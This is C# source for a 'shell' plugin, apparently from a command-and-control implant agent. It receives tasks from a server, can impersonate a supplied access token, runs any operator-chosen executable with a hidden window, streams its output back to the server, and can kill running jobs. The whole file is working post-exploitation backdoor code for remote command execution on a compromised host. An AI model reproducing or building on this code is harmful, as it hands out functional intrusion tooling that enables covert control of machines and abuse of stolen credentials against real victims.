using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace shell
{
    public class Shell : IPlugin
    {
        public string Name => "shell";
        Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
        public IAgentConfig config { get; set; }
        public IMessageManager messageManager { get; set; }
        public ILogger logger { get; set; }
        public ITokenManager tokenManager { get; set; }

        public Shell(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager)
        {
            this.messageManager = messageManager;
            this.config = config;
            this.logger = logger;
            this.tokenManager = tokenManager;
    }
        public async Task Execute(ServerJob job)
        {
            if (job.task.token != 0)
            {
                tokenManager.Impersonate(job.task.token);
            }
            try
            {
                await messageManager.AddResponse(ShellExec(job));
            }
            catch (Exception e)
            {
                //oh no an error
                messageManager.Write(e.ToString(), job.task.id, true, "error");
            }
            if (job.task.token != 0)
            {
                tokenManager.Revert();
            }
        }
        public async Task Kill(ServerJob job)
        {
            try
            {
                if (runningProcs.ContainsKey(job.task.id))
                {
                    runningProcs[job.task.id].Kill();
                    runningProcs[job.task.id].WaitForExit();

                    await messageManager.AddResponse(new ResponseResult()
                    {
                        task_id = job.task.id,
                        process_response = new Dictionary<string, string> { { "message", "0x0D" } },
                        completed = true,
                    });
                }
            }
            catch (Exception e)
            {

                await messageManager.AddResponse(new ResponseResult()
                {
                    task_id = job.task.id,
                    user_output = e.ToString(),
                    completed = true,
                    status = "error",
                });
            }
        }
        public ResponseResult ShellExec(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            string parameters = "";
            if (!String.IsNullOrEmpty(args["arguments"]))
            {
                parameters = args["arguments"];
            }

            string executable = args["executable"];
            Process process = new Process
            {
                StartInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = executable,
                    Arguments = parameters,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            try
            {
                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) messageManager.Write(errorLine.Data + Environment.NewLine, job.task.id, false, "error"); };
                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) messageManager.Write(outputLine.Data + Environment.NewLine, job.task.id, false); };

                process.Start();
                process.BeginErrorReadLine();
                process.BeginOutputReadLine();

                process.WaitForExit();
                ResponseResult result = new ResponseResult()
                {
                    user_output = Environment.NewLine + "Process Finished.",
                    task_id = job.task.id,
                    completed = true,
                };

                if (process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                }
                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = Environment.NewLine + e.ToString(),
                    task_id = job.task.id,
                    completed = true,
                    status = "error"
                };
            }
        }
    }
}
